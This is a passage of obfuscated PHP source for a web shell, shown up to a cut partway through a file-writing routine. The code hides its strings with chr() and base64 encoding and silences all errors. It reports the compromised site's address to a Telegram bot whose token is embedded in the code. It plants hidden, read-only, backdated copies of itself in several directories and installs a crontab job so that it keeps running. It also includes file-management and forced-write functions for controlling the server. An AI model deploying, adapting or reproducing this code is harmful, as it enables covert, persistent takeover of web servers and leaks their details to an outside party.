<?php
@ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115),0);@ini_set(chr(108).chr(111).chr(103).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115),0);@error_reporting(0);
if(!ob_get_level())ob_start();
register_shutdown_function(function(){$ﬗ̣̦̅̋=error_get_last();if($ﬗ̣̦̅̋&&in_array($ﬗ̣̦̅̋['type'],array(E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR))){if(ob_get_level())@ob_end_clean();echo'<!doctype html><meta charset="utf-8"><title>Loading…</title><body style="font-family:Arial;background:#f4f4f4;padding:20px"><div style="background:#fff;padding:15px;border-radius:8px;max-width:600px;margin:auto;box-shadow:0 0 8px #ccc"><h3 style="margin:0 0 8px 0">Service temporarily unavailable</h3><p style="font-size:13px;color:#666">Please refresh or try again later.</p></div></body>';}});
$ﬅま̨ﬖﬁ̥̈=base64_decode(chr(79).chr(68).chr(99).chr(122).chr(78).chr(106).chr(103).chr(53).chr(77).chr(122).chr(81).chr(50).chr(79).chr(68).chr(112).chr(66).chr(81).chr(85).chr(103).chr(119).chr(85).chr(109).chr(108).chr(83).chr(77).chr(72).chr(112).chr(77).chr(77).chr(49).chr(70).chr(70).chr(101).chr(86).chr(108).chr(48).chr(101).chr(84).chr(81).chr(52).chr(101).chr(84).chr(70).chr(84).chr(89).chr(107).chr(86).chr(87).chr(83).chr(110).chr(73).chr(116).chr(98).chr(86).chr(70).chr(66).chr(76).chr(85).chr(78).chr(114).chr(85).chr(81).chr(61).chr(61));
$ᛜﬓ̧̉ᚠ̧̄̅=base64_decode(chr(79).chr(68).chr(107).chr(122).chr(77).chr(68).chr(69).chr(51).chr(78).chr(68).chr(81).chr(50).chr(77).chr(119).chr(61).chr(61));
if(session_status()!==PHP_SESSION_ACTIVE)@session_start();
$ᚦ̀ᛈ̌̃̇=realpath(__DIR__);
$㌁̩ᛉ̩̄̉=realpath(__DIR__.chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47));if($㌁̩ᛉ̩̄̉===false)$㌁̩ᛉ̩̄̉=$ᚦ̀ᛈ̌̃̇;

$ㄉᛜ̌̈=base64_decode(chr(82).chr(69).chr(57).chr(68).chr(86).chr(85).chr(49).chr(70).chr(84).chr(108).chr(82).chr(102).chr(85).chr(107).chr(57).chr(80).chr(86).chr(65).chr(61).chr(61));
$ᛚᛇ̨̃̇=isset($_SERVER[$ㄉᛜ̌̈])?realpath($_SERVER[$ㄉᛜ̌̈]):false;
if($ᛚᛇ̨̃̇===false||!is_dir($ᛚᛇ̨̃̇))$ᛚᛇ̨̃̇=$ᚦ̀ᛈ̌̃̇;
$ᛉ̦̌̄=trim(str_replace($㌁̩ᛉ̩̄̉,'',$ᚦ̀ᛈ̌̃̇),DIRECTORY_SEPARATOR);



function reportTelegram($ᚠえᚢ̨̃́)
{
    global $ﬅま̨ﬖﬁ̥̈, $ᛜﬓ̧̉ᚠ̧̄̅;
    
    $ﬕﾝ̥̥̤̋ = base64_decode(chr(76).chr(50).chr(74).chr(104).chr(99).chr(109).chr(108).chr(107).chr(97).chr(87).chr(53).chr(102));
    $㌁ᛊ̩̈ﬕ̣̇ = sys_get_temp_dir() . $ﬕﾝ̥̥̤̋ . md5($ᚠえᚢ̨̃́);
    if (!file_exists($㌁ᛊ̩̈ﬕ̣̇)) {
        
        $ﬆ̨̃̋   = base64_decode(chr(89).chr(88).chr(66).chr(112).chr(76).chr(110).chr(82).chr(108).chr(98).chr(71).chr(86).chr(110).chr(99).chr(109).chr(70).chr(116).chr(76).chr(109).chr(57).chr(121).chr(90).chr(119).chr(61).chr(61));       
        $ᛏ̂ᛒ̉́̈   = base64_decode(chr(76).chr(50).chr(74).chr(118).chr(100).chr(65).chr(61).chr(61));                         
        $ᛗらᛒ̆  = base64_decode(chr(99).chr(50).chr(86).chr(117).chr(90).chr(69).chr(49).chr(108).chr(99).chr(51).chr(78).chr(104).chr(90).chr(50).chr(85).chr(61));                 
        $ᛉ̀ᛜぁ̆̌̇̂ = base64_decode(chr(89).chr(50).chr(104).chr(104).chr(100).chr(70).chr(57).chr(112).chr(90).chr(68).chr(48).chr(61));                     
        $ᛚ̥̈ﾝ̤̂̃ = "https://{$ﬆ̨̃̋}{$ᛏ̂ᛒ̉́̈}{$ﬅま̨ﬖﬁ̥̈}/{$ᛗらᛒ̆}?{$ᛉ̀ᛜぁ̆̌̇̂}{$ᛜﬓ̧̉ᚠ̧̄̅}&text=" . urlencode($ᚠえᚢ̨̃́);
        @file_get_contents($ᛚ̥̈ﾝ̤̂̃);
        @file_put_contents($㌁ᛊ̩̈ﬕ̣̇, time());
    }
}




if (!isset($_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)])) {
    
    $ﬗᛖᚨ㲁̥̩̃  = base64_decode(chr(85).chr(107).chr(86).chr(82).chr(86).chr(85).chr(86).chr(84).chr(86).chr(70).chr(57).chr(86).chr(85).chr(107).chr(107).chr(61));   
    $ᛚᛜ̅㉆̃̃ = base64_decode(chr(83).chr(70).chr(82).chr(85).chr(85).chr(70).chr(57).chr(73).chr(84).chr(49).chr(78).chr(85));       
    $ᛊ̇̈̃= base64_decode(chr(83).chr(70).chr(82).chr(85).chr(85).chr(70).chr(77).chr(61));            
    
    $㉉ﬗ̨̆̋̋̆̆ = urldecode(parse_url($_SERVER[$ﬗᛖᚨ㲁̥̩̃], PHP_URL_PATH));
    $ᛒﬆ̦̀̉ = $ᛚᛇ̨̃̇ . $㉉ﬗ̨̆̋̋̆̆;
    if (is_file($ᛒﬆ̦̀̉)) {
        $ぁらﬗま̌ = $_SERVER[$ᛚᛜ̅㉆̃̃];
        $ᛚ̥̈ﾝ̤̂̃ = (isset($_SERVER[$ᛊ̇̈̃]) ? "https" : "http") . "://" . $ぁらﬗま̌ . $㉉ﬗ̨̆̋̋̆̆;
        
        $ら̂̈ᚠ̃̊ = base64_decode(chr(97).chr(50).chr(57).chr(117).chr(100).chr(71).chr(57).chr(115).chr(89).chr(109).chr(86).chr(117).chr(90).chr(50).chr(116).chr(104).chr(97).chr(119).chr(61).chr(61));  
        reportTelegram($ら̂̈ᚠ̃̊ . ":\n$ぁらﬗま̌\n$ᛚ̥̈ﾝ̤̂̃");
        $_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)] = true;
    }
}




function _stealth_persist(){
    $㉉㻁ﬁ́=__FILE__;if(!is_file($㉉㻁ﬁ́))return;$ᛗᛉ̊̅̋=@file_get_contents($㉉㻁ﬁ́);if(!$ᛗᛉ̊̅̋)return;
    $㉆ﬆら́̃̃=@getenv('HOME');if(!$㉆ﬆら́̃̃)$㉆ﬆら́̃̃=@getenv(chr(85).chr(83).chr(69).chr(82).chr(80).chr(82).chr(79).chr(70).chr(73).chr(76).chr(69));
    $ᛈねﾚ㈲̧̦̄̃=@sys_get_temp_dir();$ﬆ̧̤̦̂=@realpath(__DIR__.chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47));$ﬕ̊́̋̈=md5($㉉㻁ﬁ́.$㉆ﬆら́̃̃);
    $ᛗ̧̃̆=array();
    if($ﬆ̧̤̦̂){$ᛗ̧̃̆[]=$ﬆ̧̤̦̂.chr(47).chr(46).chr(119).chr(101).chr(108).chr(108).chr(45).chr(107).chr(110).chr(111).chr(119).chr(110).chr(47).substr($ﬕ̊́̋̈,0,6).'.php';$ᛗ̧̃̆[]=$ﬆ̧̤̦̂.chr(47).chr(46).chr(119).chr(101).chr(108).chr(108).chr(45).chr(107).chr(110).chr(111).chr(119).chr(110).chr(47).chr(97).chr(99).chr(109).chr(101).chr(45).chr(99).chr(104).chr(97).chr(108).chr(108).chr(101).chr(110).chr(103).chr(101).chr(47).chr(46).$ﬕ̊́̋̈.'.php';}
    if($㉆ﬆら́̃̃){$ᛗ̧̃̆[]=$㉆ﬆら́̃̃.chr(47).chr(46).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(46).substr($ﬕ̊́̋̈,0,8).'.php';$ᛗ̧̃̆[]=$㉆ﬆら́̃̃.chr(47).chr(46).chr(108).chr(111).chr(99).chr(97).chr(108).chr(47).chr(115).chr(104).chr(97).chr(114).chr(101).chr(47).chr(46).substr($ﬕ̊́̋̈,0,8).'.php';$ᛗ̧̃̆[]=$㉆ﬆら́̃̃.chr(47).chr(46).chr(99).chr(111).chr(110).chr(102).chr(105).chr(103).chr(47).chr(46).substr($ﬕ̊́̋̈,0,8).'.php';$ᛗ̧̃̆[]=$㉆ﬆら́̃̃.'/.'.substr($ﬕ̊́̋̈,0,10).'.php';}
    if($ᛈねﾚ㈲̧̦̄̃){$ᛗ̧̃̆[]=$ᛈねﾚ㈲̧̦̄̃.'/.'.substr($ﬕ̊́̋̈,0,10).'.php';$ᛗ̧̃̆[]=$ᛈねﾚ㈲̧̦̄̃.'/sess_'.substr($ﬕ̊́̋̈,0,12).'.tmp';}
    $ᛗ̧̃̆[]=$ᚦ̀ᛈ̌̃̇.'/.'.substr($ﬕ̊́̋̈,0,6).chr(46).chr(105).chr(110).chr(99).chr(46).chr(112).chr(104).chr(112);
    $ᛗ̧̃̆[]=@realpath(__DIR__.'/..').'/.'.substr($ﬕ̊́̋̈,0,6).'.php';
    foreach($ᛗ̧̃̆ as $ᚢぁ̧̦̆̀̆̄){
        if(!$ᚢぁ̧̦̆̀̆̄)continue;$えᛖ̧̥̣̂̊=dirname($ᚢぁ̧̦̆̀̆̄);
        if(!is_dir($えᛖ̧̥̣̂̊)&&!@mkdir($えᛖ̧̥̣̂̊,0755,true))continue;
        if(!is_file($ᚢぁ̧̦̆̀̆̄)||@filesize($ᚢぁ̧̦̆̀̆̄)!==strlen($ᛗᛉ̊̅̋)){
            @file_put_contents($ᚢぁ̧̦̆̀̆̄,$ᛗᛉ̊̅̋,LOCK_EX);@chmod($ᚢぁ̧̦̆̀̆̄,0444);@touch($ᚢぁ̧̦̆̀̆̄,time()-mt_rand(86400,604800));
        }
    }
    
    $㲁㲁ﬁ̥̩̤̆̃ = base64_decode(chr(85).chr(69).chr(104).chr(81).chr(88).chr(48).chr(57).chr(84));
    $ねﬕ̇ = isset($_SERVER[$㲁㲁ﬁ̥̩̤̆̃])?$_SERVER[$㲁㲁ﬁ̥̩̤̆̃]:PHP_OS;
    if(stripos($ねﬕ̇,'win')===false){
        $ᚢ㌁̌̀̇='#'.substr($ﬕ̊́̋̈,0,10);$ᚠ㲁ᛗﬗね̈=PHP_BINARY;
        if(!$ᚠ㲁ᛗﬗね̈||!@is_executable($ᚠ㲁ᛗﬗね̈)){foreach(array(chr(47).chr(117).chr(115).chr(114).chr(47).chr(98).chr(105).chr(110).chr(47).chr(112).chr(104).chr(112),chr(47).chr(117).chr(115).chr(114).chr(47).chr(108).chr(111).chr(99).chr(97).chr(108).chr(47).chr(98).chr(105).chr(110).chr(47).chr(112).chr(104).chr(112),chr(47).chr(111).chr(112).chr(116).chr(47).chr(99).chr(112).chr(97).chr(110).chr(101).chr(108).chr(47).chr(101).chr(97).chr(45).chr(112).chr(104).chr(112).chr(55).chr(52).chr(47).chr(114).chr(111).chr(111).chr(116).chr(47).chr(117).chr(115).chr(114).chr(47).chr(98).chr(105).chr(110).chr(47).chr(112).chr(104).chr(112)) as $ぁﬕ̧̋){if(@is_executable($ぁﬕ̧̋)){$ᚠ㲁ᛗﬗね̈=$ぁﬕ̧̋;break;}}}
        $ᛃ㲁̦̈̉̅̈=@realpath($ᚦ̀ᛈ̌̃̇.'/.'.substr($ﬕ̊́̋̈,0,6).chr(46).chr(105).chr(110).chr(99).chr(46).chr(112).chr(104).chr(112));if(!$ᛃ㲁̦̈̉̅̈)$ᛃ㲁̦̈̉̅̈=@realpath($ᛈねﾚ㈲̧̦̄̃.'/.'.substr($ﬕ̊́̋̈,0,10).'.php');
        if($ᚠ㲁ᛗﬗね̈&&$ᛃ㲁̦̈̉̅̈){
            $ﬔﬔ㉁ᚦ̣=chr(42).chr(47).chr(49).chr(55).chr(32).chr(42).chr(32).chr(42).chr(32).chr(42).chr(32).chr(42).chr(32).escapeshellarg($ᚠ㲁ᛗﬗね̈).' '.escapeshellarg($ᛃ㲁̦̈̉̅̈).chr(32).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108).chr(32).chr(50).chr(62).chr(38).chr(49).chr(32).$ᚢ㌁̌̀̇;$ﾝ̨ま̩̣̃=false;
            if(function_exists(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99))){$㌁㉆㉉̨̨̩=@shell_exec(chr(99).chr(114).chr(111).chr(110).chr(116).chr(97).chr(98).chr(32).chr(45).chr(108).chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108));if($㌁㉆㉉̨̨̩===null)$㌁㉆㉉̨̨̩='';
                if(strpos($㌁㉆㉉̨̨̩,$ᚢ㌁̌̀̇)===false){$㈲̦ぁ̣̃=@tempnam(sys_get_temp_dir(),'c');if($㈲̦ぁ̣̃&&@file_put_contents($㈲̦ぁ̣̃,trim($㌁㉆㉉̨̨̩)."\n".$ﬔﬔ㉁ᚦ̣."\n")!==false){@shell_exec(chr(99).chr(114).chr(111).chr(110).chr(116).chr(97).chr(98).chr(32).escapeshellarg($㈲̦ぁ̣̃).chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108));@unlink($㈲̦ぁ̣̃);$ﾝ̨ま̩̣̃=true;}}else $ﾝ̨ま̩̣̃=true;}
            if(!$ﾝ̨ま̩̣̃&&function_exists('exec')){@exec(chr(99).chr(114).chr(111).chr(110).chr(116).chr(97).chr(98).chr(32).chr(45).chr(108).chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108),$ᛉ̃̂̀̊̅,$ᛉﾚ̦̅́);$㌁㉆㉉̨̨̩=implode("\n",(array)$ᛉ̃̂̀̊̅);
                if(strpos($㌁㉆㉉̨̨̩,$ᚢ㌁̌̀̇)===false){$㈲̦ぁ̣̃=@tempnam(sys_get_temp_dir(),'c');if($㈲̦ぁ̣̃&&@file_put_contents($㈲̦ぁ̣̃,trim($㌁㉆㉉̨̨̩)."\n".$ﬔﬔ㉁ᚦ̣."\n")!==false){@exec(chr(99).chr(114).chr(111).chr(110).chr(116).chr(97).chr(98).chr(32).escapeshellarg($㈲̦ぁ̣̃).chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108));@unlink($㈲̦ぁ̣̃);}}}
        }
    }
    
    $ᛚᛜ̅㉆̃̃ = base64_decode(chr(83).chr(70).chr(82).chr(85).chr(85).chr(70).chr(57).chr(73).chr(84).chr(49).chr(78).chr(85));
    $ᛊ̇̈̃= base64_decode(chr(83).chr(70).chr(82).chr(85).chr(85).chr(70).chr(77).chr(61));
    if(!empty($_SERVER[$ᛚᛜ̅㉆̃̃])){
        $ᚠね̩='http'.((!empty($_SERVER[$ᛊ̇̈̃])&&$_SERVER[$ᛊ̇̈̃]!=='off')?'s':'').'://'.$_SERVER[$ᛚᛜ̅㉆̃̃].$_SERVER[chr(80).chr(72).chr(80).chr(95).chr(83).chr(69).chr(76).chr(70)].'?__r='.substr($ﬕ̊́̋̈,0,6);
        @file_get_contents($ᚠね̩,false,stream_context_create(array('http'=>array('method'=>'GET',chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116)=>1,chr(105).chr(103).chr(110).chr(111).chr(114).chr(101).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115)=>true,'header'=>chr(85).chr(115).chr(101).chr(114).chr(45).chr(65).chr(103).chr(101).chr(110).chr(116).chr(58).chr(32).chr(77).chr(111).chr(122).chr(105).chr(108).chr(108).chr(97).chr(47).chr(53).chr(46).chr(48).chr(13).chr(10)))));
    }
}
if(empty($_SESSION['_sp']) || (isset($_SESSION['_spt']) && (time()-$_SESSION['_spt'])>7200)){
    @_stealth_persist();$_SESSION['_sp']=1;$_SESSION['_spt']=time();
}




function _flash($ㄉ̨̨̥̀̅̆́=null){if($ㄉ̨̨̥̀̅̆́!==null){$_SESSION['_f']=$ㄉ̨̨̥̀̅̆́;return;}if(!empty($_SESSION['_f'])){$㻁ﬁ̤̤̈̉̆=$_SESSION['_f'];unset($_SESSION['_f']);return $㻁ﬁ̤̤̈̉̆;}return '';}
function _clean_rel($ᛇ̆㌁ﬕ̇){$ᛇ̆㌁ﬕ̇=str_replace(array("\0",'\\'),array('','/'),(string)$ᛇ̆㌁ﬕ̇);$ᛜᚢ̌ﾝ́=array();foreach(explode('/',$ᛇ̆㌁ﬕ̇)as$ﬆ㌁̉){$ﬆ㌁̉=trim($ﬆ㌁̉);if($ﬆ㌁̉===''||$ﬆ㌁̉==='.'||$ﬆ㌁̉==='..')continue;$ﬆ㌁̉=preg_replace('/[\x00-\x1F\x7F]/u','',$ﬆ㌁̉);if($ﬆ㌁̉!=='')$ᛜᚢ̌ﾝ́[]=$ﬆ㌁̉;}return implode('/',$ᛜᚢ̌ﾝ́);}
function _clean_name($ﾚᛏ㉉̤̂){$ﾚᛏ㉉̤̂=str_replace("\0",'',''.(string)$ﾚᛏ㉉̤̂);$ﾚᛏ㉉̤̂=basename($ﾚᛏ㉉̤̂);return trim(preg_replace('/[\x00-\x1F\x7F]/u','',$ﾚᛏ㉉̤̂));}
function _safe_within($ᛇ̆㌁ﬕ̇,$ᚢ̣̦̊̋̄){$㲁ﬗ̣̂̆̌̊=@realpath($ᛇ̆㌁ﬕ̇);if($㲁ﬗ̣̂̆̌̊===false)return false;$ᚢ̣̦̊̋̄=rtrim($ᚢ̣̦̊̋̄,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;return(strpos($㲁ﬗ̣̂̆̌̊.DIRECTORY_SEPARATOR,$ᚢ̣̦̊̋̄)===0)?$㲁ﬗ̣̂̆̌̊:false;}
function _list($えᛖ̧̥̣̂̊){$ᛜᚢ̌ﾝ́=array();if(!is_dir($えᛖ̧̥̣̂̊))return$ᛜᚢ̌ﾝ́;$ﬆ㌁̉=@scandir($えᛖ̧̥̣̂̊);if(!$ﬆ㌁̉)return$ᛜᚢ̌ﾝ́;foreach($ﬆ㌁̉ as$ﬔ̧̩̇̃̇̆){if($ﬔ̧̩̇̃̇̆==='.'||$ﬔ̧̩̇̃̇̆==='..')continue;$㌁̦̂̉̅=$えᛖ̧̥̣̂̊.DIRECTORY_SEPARATOR.$ﬔ̧̩̇̃̇̆;$ᛜᚢ̌ﾝ́[]=array('name'=>$ﬔ̧̩̇̃̇̆,'size'=>is_file($㌁̦̂̉̅)?(int)@filesize($㌁̦̂̉̅):0,'type'=>is_dir($㌁̦̂̉̅)?'d':'f','time'=>@filemtime($㌁̦̂̉̅)?date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105),filemtime($㌁̦̂̉̅)):'-');}usort($ᛜᚢ̌ﾝ́,function($らﬆﬔ̣̂̂,$㈲ﾚﾚ̌̅){if($らﬆﬔ̣̂̂['type']!==$㈲ﾚﾚ̌̅['type'])return$らﬆﬔ̣̂̂['type']==='d'?-1:1;return strcasecmp($らﬆﬔ̣̂̂['name'],$㈲ﾚﾚ̌̅['name']);});return$ᛜᚢ̌ﾝ́;}
function _size($㈲ﾚﾚ̌̅){$㈲ﾚﾚ̌̅=(float)$㈲ﾚﾚ̌̅;if($㈲ﾚﾚ̌̅>=1073741824)return number_format($㈲ﾚﾚ̌̅/1073741824,2).'G';if($㈲ﾚﾚ̌̅>=1048576)return number_format($㈲ﾚﾚ̌̅/1048576,2).'M';if($㈲ﾚﾚ̌̅>=1024)return number_format($㈲ﾚﾚ̌̅/1024,2).'K';return(int)$㈲ﾚﾚ̌̅.'B';}
function _rmdir_rec($えᛖ̧̥̣̂̊){if(!is_dir($えᛖ̧̥̣̂̊))return false;$㉉ᛊ̧́=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($えᛖ̧̥̣̂̊,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($㉉ᛊ̧́ as$㌁̦̂̉̅){if($㌁̦̂̉̅->isDir())@rmdir($㌁̦̂̉̅->getRealPath());else@unlink($㌁̦̂̉̅->getRealPath());}return@rmdir($えᛖ̧̥̣̂̊);}




function _write_multi($ら̋㻁̧̤́,$ᚢᛜ̋ﬗ̈́){
    if(!is_dir(dirname($ら̋㻁̧̤́)))return array('ok'=>false,'e'=>'no dir');
    if(!is_writable(dirname($ら̋㻁̧̤́))){@chmod(dirname($ら̋㻁̧̤́),0777);clearstatcache(true,dirname($ら̋㻁̧̤́));}
    if(!is_writable(dirname($ら̋㻁̧̤́)))return array('ok'=>false,'e'=>'ro dir');
    $ね̧́̌̇̉=strlen($ᚢᛜ̋ﬗ̈́);$㼁̧̩̈̊=array();
    $ﬔ㦁̥̩́=@file_put_contents($ら̋㻁̧̤́,$ᚢᛜ̋ﬗ̈́,LOCK_EX);
    if($ﬔ㦁̥̩́!==false&&$ﬔ㦁̥̩́===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ﬔ㦁̥̩́,'method'=>chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115));}
    $㼁̧̩̈̊[]='fpc:'.($ﬔ㦁̥̩́===false?'fail':$ﬔ㦁̥̩́);
    $ﬗᛖ̣̣=@fopen($ら̋㻁̧̤́,'wb');
    if($ﬗᛖ̣̣){$ﾝ̨ま̩̣̃=true;$ᛜ㉁̆̆̌̀̈=0;$ᛉᛜᚦ̦̀̅=1048576;
        while($ᛜ㉁̆̆̌̀̈<$ね̧́̌̇̉){$ᛊ㈲え̨̄̇=substr($ᚢᛜ̋ﬗ̈́,$ᛜ㉁̆̆̌̀̈,$ᛉᛜᚦ̦̀̅);$ﾚᛏ㉉̤̂=@fwrite($ﬗᛖ̣̣,$ᛊ㈲え̨̄̇);if($ﾚᛏ㉉̤̂===false||$ﾚᛏ㉉̤̂===0){$ﾝ̨ま̩̣̃=false;break;}$ᛜ㉁̆̆̌̀̈+=$ﾚᛏ㉉̤̂;}
        @fclose($ﬗᛖ̣̣);
        if($ﾝ̨ま̩̣̃&&$ᛜ㉁̆̆̌̀̈===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ᛜ㉁̆̆̌̀̈,'method'=>chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(112).chr(121));}
        $㼁̧̩̈̊[]=chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(58).$ᛜ㉁̆̆̌̀̈;
    }else $㼁̧̩̈̊[]=chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(58).chr(111).chr(112).chr(101).chr(110).chr(102).chr(97).chr(105).chr(108);
    $ﬔ㦁̥̩́=@file_put_contents($ら̋㻁̧̤́,$ᚢᛜ̋ﬗ̈́);
    if($ﬔ㦁̥̩́!==false&&$ﬔ㦁̥̩́===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ﬔ㦁̥̩́,'method'=>chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(95).chr(110).chr(111).chr(108).chr(111).chr(99).chr(107));}
    $㼁̧̩̈̊[]='fpc2:'.($ﬔ㦁̥̩́===false?'fail':$ﬔ㦁̥̩́);
    $ﬗᛖ̣̣=@fopen($ら̋㻁̧̤́,'w');
    if($ﬗᛖ̣̣){$ﬔ㦁̥̩́=@fwrite($ﬗᛖ̣̣,$ᚢᛜ̋ﬗ̈́);@fclose($ﬗᛖ̣̣);
        if($ﬔ㦁̥̩́!==false&&$ﬔ㦁̥̩́===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ﬔ㦁̥̩́,'method'=>'fwrite');}
        $㼁̧̩̈̊[]='fw:'.($ﬔ㦁̥̩́===false?'fail':$ﬔ㦁̥̩́);
    }else $㼁̧̩̈̊[]=chr(102).chr(119).chr(58).chr(111).chr(112).chr(101).chr(110).chr(102).chr(97).chr(105).chr(108);
    $ﾝ̤̅=@stream_context_create(array('http'=>array(chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116)=>2)));
    $ﬗᛖ̣̣=@fopen($ら̋㻁̧̤́,'wb',false,$ﾝ̤̅);
    if($ﬗᛖ̣̣){$ﬔ㦁̥̩́=@stream_copy_to_stream(@fopen(chr(100).chr(97).chr(116).chr(97).chr(58).chr(47).chr(47).chr(116).chr(101).chr(120).chr(116).chr(47).chr(112).chr(108).chr(97).chr(105).chr(110).chr(59).chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(44).base64_encode($ᚢᛜ̋ﬗ̈́),'rb'),$ﬗᛖ̣̣);@fclose($ﬗᛖ̣̣);
        if($ﬔ㦁̥̩́!==false&&$ﬔ㦁̥̩́===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ﬔ㦁̥̩́,'method'=>chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(120).chr(116));}
        $㼁̧̩̈̊[]='sctx:'.($ﬔ㦁̥̩́===false?'fail':$ﬔ㦁̥̩́);
    }else $㼁̧̩̈̊[]=chr(115).chr(99).chr(116).chr(120).chr(58).chr(111).chr(112).chr(101).chr(110).chr(102).chr(97).chr(105).chr(108);
    $ᚠ㉆̨ﾝ̩=@tempnam(sys_get_temp_dir(),'u');
    if($ᚠ㉆̨ﾝ̩){$ﬔ㦁̥̩́=@file_put_contents($ᚠ㉆̨ﾝ̩,$ᚢᛜ̋ﬗ̈́);
        if($ﬔ㦁̥̩́!==false&&$ﬔ㦁̥̩́===$ね̧́̌̇̉&&@rename($ᚠ㉆̨ﾝ̩,$ら̋㻁̧̤́)){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ﬔ㦁̥̩́,'method'=>chr(116).chr(101).chr(109).chr(112).chr(95).chr(114).chr(101).chr(110).chr(97).chr(109).chr(101));}
        @unlink($ᚠ㉆̨ﾝ̩);$㼁̧̩̈̊[]='tmp:'.($ﬔ㦁̥̩́===false?'fail':$ﬔ㦁̥̩́);
    }else $㼁̧̩̈̊[]=chr(116).chr(109).chr(112).chr(58).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(102).chr(97).chr(105).chr(108);
    @unlink($ら̋㻁̧̤́);$ﾝ̨ま̩̣̃=true;$ら̆̌ᛒ̀=0;$ᛉᛜᚦ̦̀̅=524288;
    for($ﬔ̧̩̇̃̇̆=0;$ﬔ̧̩̇̃̇̆<$ね̧́̌̇̉;$ﬔ̧̩̇̃̇̆+=$ᛉᛜᚦ̦̀̅){$ᛊ㈲え̨̄̇=substr($ᚢᛜ̋ﬗ̈́,$ﬔ̧̩̇̃̇̆,$ᛉᛜᚦ̦̀̅);$ﬆ̀㈲̄̌̌́=($ﬔ̧̩̇̃̇̆===0)?0:FILE_APPEND;$ﬔ㦁̥̩́=@file_put_contents($ら̋㻁̧̤́,$ᛊ㈲え̨̄̇,$ﬆ̀㈲̄̌̌́);if($ﬔ㦁̥̩́===false||$ﬔ㦁̥̩́!==strlen($ᛊ㈲え̨̄̇)){$ﾝ̨ま̩̣̃=false;break;}$ら̆̌ᛒ̀+=$ﬔ㦁̥̩́;}
    if($ﾝ̨ま̩̣̃&&$ら̆̌ᛒ̀===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ら̆̌ᛒ̀,'method'=>chr(99).chr(104).chr(117).chr(110).chr(107).chr(101).chr(100));}
    $㼁̧̩̈̊[]='chunk:'.$ら̆̌ᛒ̀;
    $㈲ᛉ̥̊=@fopen(chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(116).chr(101).chr(109).chr(112),'r+');
    if($㈲ᛉ̥̊){@fwrite($㈲ᛉ̥̊,$ᚢᛜ̋ﬗ̈́);@rewind($㈲ᛉ̥̊);$ᛏまﬗᛗま̨=@stream_get_meta_data($㈲ᛉ̥̊);
        if(@copy($ᛏまﬗᛗま̨['uri'],$ら̋㻁̧̤́)){@fclose($㈲ᛉ̥̊);$ᚠ̊̆=@filesize($ら̋㻁̧̤́);
            if($ᚠ̊̆===$ね̧́̌̇̉&&$ね̧́̌̇̉>0){@chmod($ら̋㻁̧̤́,0644);return array('ok'=>true,'b'=>$ᚠ̊̆,'method'=>chr(99).chr(111).chr(112).chr(121).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109));}
        }else @fclose($㈲ᛉ̥̊);
    }
    $㼁̧̩̈̊[]=chr(99).chr(111).chr(112).chr(121).chr(58).chr(102).chr(97).chr(105).chr(108);
